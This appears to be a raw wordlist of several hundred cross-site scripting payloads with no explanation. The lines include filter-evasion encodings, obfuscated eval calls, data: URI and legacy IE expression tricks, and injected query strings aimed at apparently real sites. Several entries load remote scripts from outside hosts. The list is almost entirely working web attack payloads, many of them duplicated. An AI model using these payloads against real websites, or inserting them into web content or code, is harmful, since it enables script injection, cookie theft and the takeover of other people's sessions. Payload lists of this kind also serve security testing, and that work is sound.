=
>
>"'
_
:
'
'
"
"
(
)
&#0000060
&#000060
&#00060
&#0060
0%0d%0a%00<script src=//h4k.in>
&#00;</form><input type&#61;"date" onfocus="alert(1)">
&#00;</form><input type&#61;"date" onfocus="alert(1)">
&#00;</form><input type&#61;"date" onfocus="alert(1)">
&#00;</form><input type&#61;"date" onfocus="alert(1)">
&#060
;//%0da=eval;b=alert;a(b(10));//
';//%0da=eval;b=alert;a(b(9));//
%0da=eval;b=alert;a(b(/d/.source));
0&q=';alert(String.fromCharCode(88,83,83))//\';alert%2?8String.fromCharCode(88,83,83))//";alert(String.fromCharCode?(88,83,83))//\";alert(String.fromCharCode(88,83,83)%?29//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83%?2C83))</SCRIPT>&submit-frmGoogleWeb=Web+Search
¼script¾alert(¢CrossSiteScripting¢)¼/script¾
¼script¾alert(¢XSS¢)¼/script¾
¼script¾alert(¢XSS¢)¼/script¾
>"¼script¾document.cookie=true;¼/script¾
¼script¾document.cookie=true;¼/script¾
10,103,64,82,69,77,79,86,69,34,41,60,47,115,99,114,105,112,116,62));">String:fr
101,114,116,40,34,67,114,111,115,115,83,105,116,101,83,99,114,105,112,116,105,1
-1¼script¾document.cookie=true;¼/script¾
(1?(1?{a:1?""[1?"ev\a\l":0](1?"\a\lert":0):0}:0).a:0)[1?"\c\a\l\l":0](content,1?"x\s\s":0)
123[''+<_>ev</_>+<_>al</_>](''+<_>aler</_>+<_>t</_>+<_>(1)</_>);
&#13;<blink/&#13; onmouseover=pr&#x6F;mp&#116;(1)>OnMouseOver {Firefox & Opera}
&#13;<blink/&#13; onmouseover=pr&#x6F;mp&#116;(1)>OnMouseOver {Firefox & Opera}
&#13;<blink/&#13; onmouseover=pr&#x6F;mp&#116;(1)>OnMouseOver {Firefox & Opera}
&#13;<blink/&#13; onmouseover=pr&#x6F;mp&#116;(1)>OnMouseOver {Firefox & Opera}
1};a=eval;b=alert;a(b(14));//
1];a=eval;b=alert;a(b(17));//
1;a=eval;b=alert;a(b(/c/.source));
-1<a href="about:<script>document.cookie=true;</script>">
-1<a href="javascript#document.cookie=true;">
1<a href=#><line xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute href=javascript:javascript:alert(1) strokecolor=white strokeweight=1000px from=0 to=1000 /></a>
1<a href=#><line xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute href=javascript:javascript:alert(1) strokecolor=white strokeweight=1000px from=0 to=1000 /></a>
1<animate/xmlns=urn:schemas-microsoft-com:time style=behavior:url(#default#time2) attributename=innerhtml values=&lt;img/src=&quot;.&quot;onerror=javascript:alert(1)&gt;>
1<animate/xmlns=urn:schemas-microsoft-com:time style=behavior:url(#default#time2) attributename=innerhtml values=&lt;img/src=&quot;.&quot;onerror=javascript:alert(1)&gt;>
-1<BASE HREF="javascript:document.cookie=true;//">
-1<bgsound src="javascript:document.cookie=true;">
-1<BGSOUND SRC="javascript:document.cookie=true;">
-1<BODY BACKGROUND="javascript:document.cookie=true;">
-1<body onload="document.cookie=true;">
-1<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=document.cookie=true;>
-1<BODY ONLOAD=document.cookie=true;>
-1<BR SIZE="&{document.cookie=true}">
-1<CrossSiteScripting STYLE="CrossSiteScripting:expression(document.cookie=true)">
-1<div datafld="b" dataformatas="html" datasrc="#X"></div> ]]>  [\xC0][\xBC]script>document.cookie=true;[\xC0][\xBC]/script>
-1<div onmouseover="document.cookie=true;">
-1<div style="background-image: url(javascript:document.cookie=true;);">
-1<DIV STYLE="background-image: url(javascript:document.cookie=true;)">
-1<DIV STYLE="background-image: url(javascript:document.cookie=true;)">
-1<div style="behaviour: url([link to code]);">
-1<div style="binding: url([link to code]);">
-1<div style="width: expression(document.cookie=true;);">
-1<DIV STYLE="width: expression(document.cookie=true);">
-1&{document.cookie=true;};
-1<? echo('<SCR)';echo('IPT>document.cookie=true</SCRIPT>'); ?>
___=1?'ert(123)':0,_=1?'al':0,__=1?'ev':0,1[__+_](_+___)
-1exp/*<A STYLE='no\CrossSiteScripting:noCrossSiteScripting("*//*");CrossSiteScripting:ex/*CrossSiteScripting*//*/*/pression(document.cookie=true)'>
-1<FRAMESET><FRAME SRC="javascript:document.cookie=true;"></FRAMESET>
-1<HEAD><META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=UTF-7"> </HEAD>+ADw-SCRIPT+AD4-document.cookie=true;+ADw-/SCRIPT+AD4-
-1<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="CrossSiteScripting<SCRIPT DEFER>document.cookie=true</SCRIPT>"></BODY></HTML>
-1<iframe src="javascript:document.cookie=true;>
-1<IFRAME SRC="javascript:document.cookie=true;"></IFRAME>
-1<img dynsrc="javascript:document.cookie=true;">
-1<IMG DYNSRC="javascript:document.cookie=true;">
-1<IMG LOWSRC="javascript:document.cookie=true;">
-1<img src="blah>" onmouseover="document.cookie=true;">
-1<img src="blah"onmouseover="document.cookie=true;">
-1<img src=&{document.cookie=true;};>
-1<img src="javascript:document.cookie=true;">
-1<IMG SRC="  javascript:document.cookie=true;">
-1<IMG SRC="jav ascript:document.cookie=true;">
-1<IMG SRC="javascript:document.cookie=true;">
-1<IMG SRC="javascript:document.cookie=true;">
-1<img src="livescript:document.cookie=true;">
-1<img src="mocha:document.cookie=true;">
-1<IMG STYLE="CrossSiteScripting:expr/*CrossSiteScripting*/ession(document.cookie=true)">
-1<input type="image" dynsrc="javascript:document.cookie=true;">
-1<INPUT TYPE="IMAGE" SRC="javascript:document.cookie=true;">
-1<LAYER SRC="javascript:document.cookie=true;"></LAYER>
-1<link rel="stylesheet" href="javascript:document.cookie=true;">
-1<LINK REL="stylesheet" HREF="javascript:document.cookie=true;">
-1<meta http-equiv="refresh" content="0;url=javascript:document.cookie=true;">
-1<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>document.cookie=true</SCRIPT>">
-1<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:document.cookie=true></OBJECT>
-1<object classid="clsid:..." codebase="javascript:document.cookie=true;">
-1<SCRIPT>a=/CrossSiteScripting/\ndocument.cookie=true;</SCRIPT>
-1<SCRIPT <B>document.cookie=true;</SCRIPT>
-1<<script>document.cookie=true;</script>
-1<!-- -- --><script>document.cookie=true;</script><!-- -- -->
-1<script>document.cookie=true;//--></script>
-1&<script>document.cookie=true;</script>
-1<SCRIPT>document.cookie=true;</SCRIPT>
-1<SCRIPT>document.cookie=true;</SCRIPT>
-1<SCRIPT>document.cookie=true;//<</SCRIPT>
1<set/xmlns=`urn:schemas-microsoft-com:time` style=`beh&#x41vior:url(#default#time2)` attributename=`innerhtml` to=`&lt;img/src=&quot;x&quot;onerror=javascript:alert(1)&gt;`>
1<set/xmlns=`urn:schemas-microsoft-com:time` style=`beh&#x41vior:url(#default#time2)` attributename=`innerhtml` to=`&lt;img/src=&quot;x&quot;onerror=javascript:alert(1)&gt;`>
-1<STYLE>.CrossSiteScripting{background-image:url("javascript:document.cookie=true");}</STYLE><A CLASS=CrossSiteScripting></A>
-1<STYLE>@im\port'\ja\vasc\ript:document.cookie=true';</STYLE>
-1<STYLE>li {list-style-image: url("javascript:document.cookie=true;");</STYLE><UL><LI>CrossSiteScripting
-1<style><!--</style><script>document.cookie=true;//--></script>
-1<STYLE type="text/css">BODY{background:url("javascript:document.cookie=true")}</STYLE>
-1<style type="text/javascript">document.cookie=true;</style>
-1<STYLE TYPE="text/javascript">document.cookie=true;</STYLE>
-1<TABLE BACKGROUND="javascript:document.cookie=true;">
-1<TABLE><TD BACKGROUND="javascript:document.cookie=true;">
-1</TITLE><SCRIPT>document.cookie=true;</SCRIPT>
-1<XML ID="CrossSiteScripting"><I><B><IMG SRC="javas<!-- -->cript:document.cookie=true"></B></I></XML><SPAN DATASRC="#CrossSiteScripting" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>
-1<XML ID=I><X><C><![CDATA[<IMG SRC="javas]]<![CDATA[cript:document.cookie=true;">]]</C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
-1<xml id="X"><a><b><script>document.cookie=true;</script>;</b></a></xml>
-1<xml src="javascript:document.cookie=true;">
>%22%27><img%20src%3d%22javascript:alert(%27%20XSS%27)%22>
%22/%3E%3CBODY%20onload=ídocument.write(%22%3Cs%22%2b%22cript%20src=http://my.box.com/xss.js%3E%3C/script%3E%22)í%3E
&%22%3E%3Cscript%3Ealert%28/XSSPOSED/%29%3C/script%3EinvocationType=enus-mh-1_-aol-ws-na-na&sourceType=150&query=icq
'%22--%3E%3C/style%3E%3C/script%3E%3Cscript%3Eshadowlabs(0x000045)%3C/script%3E
%253cscript%253ealert(document.cookie)%253c/script%253e
%26%2339);x=alert;x(%26%2340 /finally through!/.source %26%2341);//
%27%22--%3E%3C%2Fstyle%3E%3C%2Fscript%3E%3Cscript%3ERWAR%280x00010E%29%3C%2Fscript%3E
&%27;}alert%28%27xssd%27%29;%3C/script%3E
%2BACIAPgA8-script%2BAD4-alert%28document.location%29%2BADw-%2Fscript%2BAD4APAAi-
%2BADw-script+AD4-alert(document.location)%2BADw-/script%2BAD4-
&#34;&#62;<h1/onmouseover='\u0061lert(1)'>%00
&#34;&#62;<h1/onmouseover='\u0061lert(1)'>%00
&#34;&#62;<h1/onmouseover='\u0061lert(1)'>%00
&#34;&#62;<h1/onmouseover='\u0061lert(1)'>%00
&#34;&#62;<svg><style>{-o-link-source&colon;'<body/onload=confirm(1)>'
&#34;&#62;<svg><style>{-o-link-source&colon;'<body/onload=confirm(1)>'
&#34;&#62;<svg><style>{-o-link-source&colon;'<body/onload=confirm(1)>'
&#34;&#62;<svg><style>{-o-link-source&colon;'<body/onload=confirm(1)>'
%3C
%3C%69%66%72%61%6D%65%20%73%72%63%3D%68%74%74%70%3A%2F%2F%74%65%73%74%2E%64%65%3E
%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%22%43%72%6F
<%3C&lt&lt;&LT&LT;&#60&#060&#0060&#00060&#000060&#0000060&#60;&#060;&#0060;&#00060;&#000060;&#0000060;&#x3c&#x03c&#x003c&#x0003c&#x00003c&#x000003c&#x3c;&#x03c;&#x003c;&#x0003c;&#x00003c;&#x000003c;&#X3c&#X03c&#X003c&#X0003c&#X00003c&#X000003c&#X3c;&#X03c;&#X003c;&#X0003c;&#X00003c;&#X000003c;&#x3C&#x03C&#x003C&#x0003C&#x00003C&#x000003C&#x3C;&#x03C;&#x003C;&#x0003C;&#x00003C;&#x000003C;&#X3C&#X03C&#X003C&#X0003C&#X00003C&#X000003C&#X3C;&#X03C;&#X003C;&#X0003C;&#X00003C;&#X000003C;\x3c\x3C\u003c\u003C
&=%3Cscript%3Ealert(%22Canada%20Xss%22)%3C/script%3E
%3Cscript%3Exhr=new%20ActiveXObject%28%22Msxml2.XMLHTTP%22%29;xhr.open%28%22GET%22,%22/xssme2%22,true%29;xhr.onreadystatechange=function%28%29{if%28xhr.readyState==4%26%26xhr.status==200%29{alert%28xhr.responseText.match%28/%27%28[^%27]%2b%29/%29[1]%29}};xhr.send%28%29;%3C/script%3E
+49/>"<iframe src=http://vulnerability-lab.com>1337
&#60
&#60&#105&#102&#114&#97&#109&#101&#32&#115&#114&#99&#61&#104&#116&#116&#112&#58&#47&#47&#116&#101&#115&#116&#46&#100&#101&#62
%73%63%72%69%70%74%3E
<%73%63%72%69%70%74> %64 = %64%6f%63%75%6d%65%6e%74%2e%63%72%65%61%74%65%45%6c%65%6d%65%6e%74(%22%64%69%76%22); %64%2e%61%70%70%65%6e%64%43%68%69%6c%64(%64%6f%63%75%6d%65%6e%74%2e%68%65%61%64%2e%63%6c%6f%6e%65%4e%6f%64%65(%74%72%75%65)); %61%6c%65%72%74(%64%2e%69%6e%6e%65%72%48%54%4d%4c%2e%6d%61%74%63%68(%22%63%6f%6f%6b%69%65 = '(%2e%2a%3f)'%22)[%31]); </%73%63%72%69%70%74>
%73%73%53%69%74%65%53%63%72%69%70%74%69%6E%67%32%22%29%3C%2F
a
a
a
A
a=0||'ev'+'al'||0;b=0||'locatio';b+=0||'n.h'+'ash.sub'||0;b+=0||'str(1)';c=b[a];c(c(b))
a=0||'ev'+'al',b=0||location.hash,c=0||'sub'+'str',1[a](b[c](1))
&a=0I_2QhAGaI8&u=%2Fwatch%3Fv%3DTnZ7unBHWLQ%26feature%3Dshare
a=1;a=eval;b=alert;a(b(11));//
a=%1B$*H%1BN&b=%20type=image%20src=x%20onerror=alert(document.c haracterSet);//
<a&#32;href&#61;&#91;&#00;&#93;"&#00; onmouseover=prompt&#40;1&#41;&#47;&#47;">XYZ</a
<a&#32;href&#61;&#91;&#00;&#93;"&#00; onmouseover=prompt&#40;1&#41;&#47;&#47;">XYZ</a
<a&#32;href&#61;&#91;&#00;&#93;"&#00; onmouseover=prompt&#40;1&#41;&#47;&#47;">XYZ</a
<a&#32;href&#61;&#91;&#00;&#93;"&#00; onmouseover=prompt&#40;1&#41;&#47;&#47;">XYZ</a
<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa  aaaaaaaaa aaaaaaaaaa  href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe
<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe
<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe
<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe
<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe
<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe
a=<a><b>%3c%69%6d%67%2f%73%72%63%3d%31%20%6f%6e%65%72%72%6f%72%3d%61%6c%65%72%74%28%31%29%3e</b></a>document.write(unescape(a..b))
a=alert a(0)
A=alert;A(1)
"'`>ABC<div style="font-family:'foo'\x3Bx:expression(javascript:alert(1);/*';">DEF
"'`>ABC<div style="font-family:'foo'\x3Bx:expression(javascript:alert(1);/*';">DEF
"'`>ABC<div style="font-family:'foo'\x7Dx:expression(javascript:alert(1);/*';">DEF
"'`>ABC<div style="font-family:'foo'\x7Dx:expression(javascript:alert(1);/*';">DEF
ABC<div style="x:expression\x00(javascript:alert(1)">DEF
ABC<div style="x:expression\x00(javascript:alert(1)">DEF
ABC<div style="x:expression\x5C(javascript:alert(1)">DEF
ABC<div style="x:expression\x5C(javascript:alert(1)">DEF
ABC<div style="x:exp\x00ression(javascript:alert(1)">DEF
ABC<div style="x:exp\x00ression(javascript:alert(1)">DEF
ABC<div style="x:exp\x5Cression(javascript:alert(1)">DEF
ABC<div style="x:exp\x5Cression(javascript:alert(1)">DEF
ABC<div style="x:\x00expression(javascript:alert(1)">DEF
ABC<div style="x:\x00expression(javascript:alert(1)">DEF
ABC<div style="x:\x09expression(javascript:alert(1)">DEF
ABC<div style="x:\x09expression(javascript:alert(1)">DEF
ABC<div style="x:\x0Aexpression(javascript:alert(1)">DEF
ABC<div style="x:\x0Aexpression(javascript:alert(1)">DEF
ABC<div style="x:\x0Bexpression(javascript:alert(1)">DEF
ABC<div style="x:\x0Bexpression(javascript:alert(1)">DEF
ABC<div style="x:\x0Cexpression(javascript:alert(1)">DEF
ABC<div style="x:\x0Cexpression(javascript:alert(1)">DEF
ABC<div style="x:\x0Dexpression(javascript:alert(1)">DEF
ABC<div style="x:\x0Dexpression(javascript:alert(1)">DEF
ABC<div style="x:\x20expression(javascript:alert(1)">DEF
ABC<div style="x:\x20expression(javascript:alert(1)">DEF
ABC<div style="x\x3Aexpression(javascript:alert(1)">DEF
ABC<div style="x\x3Aexpression(javascript:alert(1)">DEF
ABC<div style="x:\xC2\xA0expression(javascript:alert(1)">DEF
ABC<div style="x:\xC2\xA0expression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x80expression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x80expression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x81expression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x81expression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x82expression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x82expression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x83expression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x83expression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x84expression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x84expression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x85expression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x85expression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x86expression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x86expression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x87expression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x87expression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x88expression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x88expression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x89expression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x89expression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x8Aexpression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x8Aexpression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x8Bexpression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x8Bexpression(javascript:alert(1)">DEF
ABC<div style="x:\xE3\x80\x80expression(javascript:alert(1)">DEF
ABC<div style="x:\xE3\x80\x80expression(javascript:alert(1)">DEF
ABC<div style="x:\xEF\xBB\xBFexpression(javascript:alert(1)">DEF
ABC<div style="x:\xEF\xBB\xBFexpression(javascript:alert(1)">DEF
+ACIAPgA8-script+AD4-alert(document.location)+ADw-/script+AD4APAAi-
&action=advanced_search&query="><script>alert('XSS')</script>
&action=check_availability&goto=metarefresh&formaction="><script>alert(String.fromCharCode(88,83,83))</script>
&action=file&text=%3Cscript%3Ealert%28%27XSS%27%29;%3C/script%3E
&action=find&find=%3Cscript%3Ealert%28/XSSPOSED/%29%3C/script%3E
&action=install&name=Offline%20Mail&message=Hi,%20Reddit&icon_src=http%3A%2F%2Fmail.google.com%2Fmail%2Fimages%2F2%2Fmail_icon_48.png&return=https%3A%2F%2Fmail.google.com%2Fmail%2F%23lsci
&action=load&temID=search&seachtxt=%22%3E%3Cscript%3Ealert%28%27xss%27%29%3C/script%3E
&action=QueryAction.submitBasicSearch&type_basic=extern&sortOrder=&pageNumber=1&q='><body%20onload=alert%28"XSS"%29>&hdrsrchsubmit.x=0&hdrsrchsubmit.y=0&hdrsrchsubmit=Search
&action=search-events&where=%22%3E%3Cbody%20onload=alert(%22XSS%22)%3E%3Cinput%20%22
&action=search&firstRequest=1&query=%27%3Balert%28%2FXSSPOSED%29%2F%2F\\%27%3Balert%281%29%2F%2F%22%3Balert%282%29%2F%2F\\%22%3Balert%283%29%2F%2F--%3E%3C%2FSCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert%28%2FXSSPOSED%2F%29%3C%2FSCRIPT%3E%3D%26{}%22%29%3B}alert%286%29%3Bfunction%2Bxss%28%29{%2F%2F%26q%3D%27%3Balert%280%29%2F%2F\\%27%3Balert%281%29%2F%2F%22%3Balert%282%29%2F%2F\\%22%3Balert%283%29%2F%2F--%3E%3C%2FSCRIPT%3E%22%3E%27%3E%3CSCRIPT%3Ealert%28%2FXSSPOSED%2F%29%3C%2FSCRIPT%3E%3D%26{}%22%29%3B}alert%286%29%3Bfunction%2Bxss%28%29{%2F%2F&x=30&y=17&searchindex=gsa
&action=search&firstRequest=1&searchindex=gsa&query=';alert(/XSSPOSED)//\\';alert(1)//";alert(2)//\\";alert(/XSSPOSED/)//--></SCRIPT>">'><SCRIPT>alert(/XSSPOSED/)</SCRIPT>=&{}");}alert(6);function+xss(){//&q=';alert(0)//\\';alert(1)//";alert(2)//\\";alert(/XSSPOSED/)//--></SCRIPT>">'><SCRIPT>alert(/XSSPOSED/)</SCRIPT>=&{}");}alert(6);function+xss(){//
&action=search&storeid=2557708&searchtext=%22%3Cscript%3Ealert('Hello%20Reddit')%3C/script%3E&submitbutton.x=0&submitbutton.y=0
&action=subscribe&email=%3Cscript%3Ealert%28String.fromCharCode%2888,%2083,%2083,%2080,%2079,%2083,%2069,%2068%29%29%3C/script%3E
add <!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=http://vulnerability-lab.com/CrossSiteScripting.js></SCRIPT>'"-->
add name <script>alert('VL')</script>
add topic <iframe src=http://www.vulnerability-lab.com>
add user <script>alert(document.cookie)</script> <script>alert(document.cookie)</script>@gmail.com
&adID=DEGWORDSTATUS&orderNum=%22%3E%3Cscript%3Ealert%28%27XSS%27%29;%3C/script%3E&postal=50210
+ADw-img src=+ACI-1+ACI- onerror=+ACI-alert(1)+ACI- /+AD4-
+ADw-script+AD4-alert(document.location)+ADw-/script+AD4-
};a=eval;b=alert;a(b(12));//
'};a=eval;b=alert;a(b(13));//
'];a=eval;b=alert;a(b(15));//
];a=eval;b=alert;a(b(16));//
*/a=eval;b=alert;a(b(/e/.source));/*
a=/ev/ .source a+=/al/ .source,a = a[a] a(name)
a=/ev/// .source a+=/al/// .source a[a] (name)
"><a fooooooooooooooooooooooooooooooooo href=JaVAScript%26colon%3Bprompt%26lpar%3B1%26rpar%3B%>
&&afp=%22%3E%3Cscript%3Ealert%28%27xssd%27%29;%3C/script%3E&afu=%22%3E%3Ctextarea%3E
a="get";
a=\"get\";
a="get";&#10;b="URL("";&#10;c="javascript:";&#10;d="alert('XSS');")";eval(a+b+c+d);
a="get";b="URL";c="javascript:";d="alert('xss');";eval(a?);
a="get";b="URL(ja\"";c="vascr";d="ipt:ale";e="rt('XSS');\")";eval(a+b+c+d+e);
<a href="&#106&#97&#118&#97&#115&#99&#114&#105&#112&#116&#58&#99&#111&#110&#102&#105&#1 14&#109&#40&#49&#41">Clickhere</a>
<a href="&#1;javascript:alert(1)">CLICK ME<a>
<a href="&#38&#35&#49&#48&#54&#38&#35&#57&#55&#38&#35&#49&#49&#56&#38&#35&#57&#55&#38& #35&#49&#49&#53&#38&#35&#57&#57&#38&#35&#49&#49&#52&#38&#35&#49&#48&#53&#38&#35&#4 9&#49&#50&#38&#35&#49&#49&#54&#38&#35&#53&#56&#38&#35&#57&#57&#38&#35&#49&#49&#49& #38&#35&#49&#49&#48&#38&#35&#49&#48&#50&#38&#35&#49&#48&#53&#38&#35&#49&#49&#52&#3 8&#35&#49&#48&#57&#38&#35&#52&#48&#38&#35&#52&#57&#38&#35&#52&#49">Clickhere</a>
<a href="about:<script>document.cookie=true;</script>">
>"<a href="about:<script>document.cookie=true;</script>">
<!--<A href="- --><a href=javascript:alert:document.domain>test-->
<a href="data:application/x-x509-user-cert;&NewLine;base64&NewLine;,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="&#09;&#10;&#11;>X</a
<a href="data:application/x-x509-user-cert;&NewLine;base64&NewLine;,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="&#09;&#10;&#11;>X</a
<a href="data:application/x-x509-user-cert;&NewLine;base64&NewLine;,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="&#09;&#10;&#11;>X</a
<a href="data:application/x-x509-user-cert;&NewLine;base64&NewLine;,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="&#09;&#10;&#11;>X</a
<a/href=data&colon;text/html;&Tab;base64&Tab;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==>ClickMe</a>
<a/href=data&colon;text/html;&Tab;base64&Tab;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==>ClickMe</a>
<a href="data:text/html;base64_,<svg/onload=\u0061&#x6C;&#101%72t(1)>">X</a
<a href="data:text/html;base64_,<svg/onload=\u0061&#x6C;&#101%72t(1)>">X</a
<a href="data:text/html;base64_,<svg/onload=\u0061&#x6C;&#101%72t(1)>">X</a
<a href="data:text/html;base64_,<svg/onload=\u0061&#x6C;&#101%72t(1)>">X</a
<a href="data:text/html;base64_,<svg/onload=\u0061&#x6C;&#101%72t(1)>">X</a
<a href="data:text/html;base64_,<svg/onload=\u0061&#x6C;&#101%72t(1)>">X</a
<a  href="data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203">Click  Me</a>
<a href="data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203">Click Me</a>
<a href="data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203">Click Me</a><meta http-equiv="refresh" content="0;url=javascript:document.cookie=true;">
<a href="data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203">Click Me</a><sCrIpt>alert(1)</ScRipt>
<a href="data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203">Click Me</a><script\x20type="text/javascript">javascript:alert(1);</script>
<a href="data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203">Click Me</a>with(document)getElementsByTagName('head')[0].appendChild(createElement('script')).src='//ŋ.ws'
<a href="data:text&sol;html,&lt;script&gt;alert(1)&lt/script&gt">Click<test>
<a href="data:text&sol;html;&Tab;base64&NewLine;,PGJvZHkgb25sb2FkPWFsZXJ0KDEpPg==">Click<test>
<A HREF="//google">XSS</A>
<A HREF="http://0102.0146.0007.00000223/">XSS</A>
<A HREF="http://0102.0146.0007.00000223/">XSS</A>
<A HREF="http://0102.0146.0007.00000223/">XSS</A>
<A HREF="http://0x42.0x0000066.0x7.0x93/">XSS</A>
<A HREF="http://0x42.0x0000066.0x7.0x93/">XSS</A>
<A HREF="http://0x42.0x0000066.0x7.0x93/">XSS</A>
<A HREF="http://1113982867/">CrossSiteScripting</A>
<A HREF="http://1113982867/">XSS</A>
<A HREF="http://1113982867/">XSS</A>
<A HREF="http://1113982867/">XSS</A>
<A HREF="http://6&#09;6.000146.0x7.147/">XSS</A>
<A HREF="htt    p://6    6.000146.0x7.147/">XSS</A>
<A HREF="htt	p://6	6.000146.0x7.147/">XSS</A>
<A HREF="http://66.102.7.147/">XSS</A>
<A HREF="http://66.102.7.147/">XSS</A>
<A HREF="http://66.102.7.147/">XSS</A>
<A HREF="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D">CrossSiteScripting</A>
<A HREF="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D">XSS</A>
<A HREF="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D">XSS</A>
<A HREF="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D">XSS</A>
<a href=http://foo.bar/#x=`y></a><img alt="`><img src=x:x onerror=javascript:alert(1)></a>">
<a href=http://foo.bar/#x=`y></a><img alt="`><img src=x:x onerror=javascript:alert(1)></a>">
<A HREF="http://google.com/">XSS</A>
<A HREF="http://google:ha.ckers.org">XSS</A>
<A HREF="http://ha.ckers.org@google">XSS</A>
<A HREF="http://server.com/">CrossSiteScripting</A>
<A HREF="http://www.gohttp://www.google.com/ogle.com/">XSS</A>
<a href=”http://www.google.com>Clickme</a>
<A HREF="http://www.google.com./">XSS</A>
<a href="j&#00097;vascript:alert%252831337%2529">Hello</a>
<a href="jav&#65ascript:javascript:alert(1)">test1</a>
